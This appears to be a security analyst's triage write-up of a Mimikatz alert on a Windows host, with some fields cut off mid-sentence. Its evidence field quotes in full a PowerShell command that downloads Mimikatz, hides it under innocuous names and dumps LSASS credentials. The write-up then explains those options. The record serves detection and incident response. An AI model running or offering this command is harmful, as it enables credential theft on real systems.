alerts.whatTriggered: The Mimikatz credential harvesting tool was executed and detected as the threat 'HackTool:Win32/Mimikatz.I' on the host ec2amaz-9oh9aqq.
alerts.whatHappened: The Mimikatz hacktool was detected on this device. Mimikatz is a credential theft tool that can harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. An attacker might be trying to harvest credentials to log into this or other devices on the network, by impersonating a valid user.
alerts.evidence:
The following command was ran:
`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell.exe -ExecutionPolicy Bypass -C md "$env:TEMP\svcdiag" -f | Out-Null; (New-Object Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip',"$env:TEMP\svcdiag\kb97413.zip"); Expand-Archive "$env:TEMP\svcdiag\kb97413.zip" "$env:TEMP\svcdiag" -f; & "$env:TEMP\svcdiag\x64\mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit`

The command uses PowerShell to download an execute Mimikatz from Github. The following options were used for Mimikatz:
* privilege::debug - Gives Mimikatz permissions to interact with the LSASS process.
* sekurlsa::logonpassword - Interrogates LSASS memory to extract clear-text passwords, NTLM hashes, and Kerberos tickets for users currently and recently logged on to the system.
alerts.verdictJustification: The Mimikatz credential harvesting tool was exc
alerts.containment:
Immediate isolation of the device is recommended; followed by Immediate escalation to determine whether the activity is expected.
If
alerts.lessonsLearned: I learned how Mimikatz can be used to harvest credentials from the LSASS process on a Windows system.
